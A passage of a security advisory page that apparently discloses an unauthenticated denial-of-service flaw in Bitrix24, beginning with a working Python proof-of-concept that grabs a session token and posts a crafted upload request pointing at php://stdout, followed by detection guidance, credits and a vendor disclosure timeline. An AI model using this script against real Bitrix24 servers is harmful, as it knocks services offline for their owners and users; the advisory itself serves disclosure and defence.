</span></span><span class="line"><span class="cl"><span class="n">PROXY</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s2">&#34;http://localhost:8080&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">preauth</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOST</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;&#39;bitrix_sessid&#39;:&#39;([a-f0-9]</span><span class="si">{32}</span><span class="s2">)&#39;&#34;</span><span class="p">),</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">DoS</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">CID</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/desktop_app/file.ajax.php?action=uploadfile&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;X-Bitrix-Csrf-Token&#34;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;X-Bitrix-Site-Id&#34;</span><span class="p">:</span> <span class="n">SITE_ID</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[mode]&#34;</span><span class="p">:</span> <span class="s2">&#34;upload&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[CID]&#34;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">CID</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[filesCount]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[packageIndex]&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;pIndex</span><span class="si">{</span><span class="n">CID</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_info[NAME]&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;file</span><span class="si">{</span><span class="n">CID</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_files[0][name]&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;file</span><span class="si">{</span><span class="n">CID</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_files[0][files][default][tmp_url]&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;a:php://stdout&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;bxu_files[0][files][default][tmp_name]&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;file</span><span class="si">{</span><span class="n">CID</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">proxies</span><span class="o">=</span><span class="n">PROXY</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">PROXY</span>
</span></span><span class="line"><span class="cl">    <span class="n">sessid</span> <span class="o">=</span> <span class="n">preauth</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Launching DoS...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">DoS</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">)</span>
</span></span></code></pre></div><h2 id="exploit-conditions">Exploit Conditions:<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h2>
<p>This vulnerability can be exploited by unauthenticated users.</p>
<h2 id="detection-guidance">Detection Guidance:<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h2>
<p>It is possible to detect the exploitation of this vulnerability by examining traffic logs to detect the presence of <code>php://stdout</code> or <code>file:///dev/stdout</code> in request bodies.</p>
<h2 id="credits">Credits<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
<p>Lam Jun Rong &amp; Li Jiantao of of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
<h2 id="timeline">Timeline<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
<ul>
<li>2023-03-17 Initial Vendor Contact via <a href="https://www.bitrix24.com/report/">https://www.bitrix24.com/report/</a></li>
<li>2023-03-18 No reply from vendor, tried using the form again</li>
<li>2023-03-21 Email to <a href="/cdn-cgi/l/email-protection#6d04030b022d0f04191f0415430e0200"><span class="__cf_email__" data-cfemail="dab3b4bcb59ab8b3aea8b3a2f4b9b5b7">[email&#160;protected]</span></a></li>
<li>2023-03-21 Email to <a href="/cdn-cgi/l/email-protection#0d64636b624d3c6e206f64797f6475237f78"><span class="__cf_email__" data-cfemail="3f565159507f0e5c125d564b4d5647114d4a">[email&#160;protected]</span></a></li>
<li>2023-03-24 Got reply from <a href="/cdn-cgi/l/email-protection#9ff6f1f9f0dfaefcb2fdf6ebedf6e7b1edea"><span class="__cf_email__" data-cfemail="1871767e7758297b357a716c6a7160366a6d">[email&#160;protected]</span></a>, they asked us to email to <a href="/cdn-cgi/l/email-protection#234a4d454c63414a57514a5b0d404c4e"><span class="__cf_email__" data-cfemail="5d34333b321d3f34292f3425733e3230">[email&#160;protected]</span></a> or use the form at <a href="https://www.bitrix24.com/report/">https://www.bitrix24.com/report/</a> with regards to the bug reports</li>
<li>2023-03-29 Emailed to [redacted], [redacted] &amp; [redacted]. Team member found the 3 email addresses via an [USA bug bounty platform]</li>
<li>2023-03-30 [redacted] replied to us</li>
<li>2023-03-31 [redacted] wanted us to report the bugs via that [USA bug bounty platform]</li>
<li>2023-03-31 Emailed back to [redacted] that we are unable to do so because it&rsquo;s a private program in that [USA bug bounty platform]</li>
<li>2023-03-31 [redacted] emailed back with the invite</li>
<li>2023-03-31 Submitted the reports via that [USA bug bounty platform]</li>
<li>2023-03-31 Informed [redacted] again that we are unable to report all the bugs due to [blah blah blah Requirements]</li>
<li>2023-04-03 [redacted] replied that they had remove the [blah blah blah Requirements] limitations for us</li>
<li>2023-04-04 We submitted the final 2 reports</li>
<li>2023-06-21 [redacted] emailed us &ldquo;Generally, we prefer not to publish CVE, because our clients tend to postpone or skip even critical updates, and hackers definitely will be using this information for attacking our clients. It have happened several times in the past, with huge consequences for our company and for our clients. To tell the truth, I would like to set award on [USA bug bounty platform] instead of CVE publishing. Please let me know what do you think about that.&rdquo;</li>
<li>2023-06-23 Emailed back to Bitrix that we prefer to publish the CVE and do not want the reward. We are also willing to delay the publication at a mutually agreed date.</li>
<li>2023-09-22 [redacted] finally replied asking us if we are agreeable to publish the CVE in November 2023</li>
<li>2023-09-22 Emailed back that we are agreeable to delay the publication to 1st November 2023</li>
<li>2023-09-22 [redacted] accepted the date</li>
<li>2023-11-01 Public Release</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://starlabs.sg/advisories/23/23-1717/">
    <span class="title">« Prev</span>
    <br>
    <span>(CVE-2023-1717) Bitrix24 Cross-Site Scripting (XSS) via Client-side Prototype Pollution</span>
  </a>
  <a class="next" href="https://starlabs.sg/advisories/23/23-1719/">
    <span class="title">Next »</span>
    <br>
    <span>(CVE-2023-1719) Bitrix24 Insecure Global Variable Extraction</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
